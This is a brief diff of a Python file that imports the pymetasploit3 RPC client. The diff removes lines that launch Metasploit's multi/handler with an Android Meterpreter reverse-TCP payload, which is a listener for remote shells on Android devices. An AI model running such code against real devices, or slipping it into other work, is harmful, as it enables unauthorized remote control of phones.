@@ -10,8 +10,3 @@ import requests
 import json
 
 from pymetasploit3.msfrpc import MsfRpcClient
-
-
-exploit = client.modules.use("exploit", "multi/handler")
-payload = client.modules.use("payload", "android/meterpreter/reverse_tcp")
-exploit.execute(payload=payload)
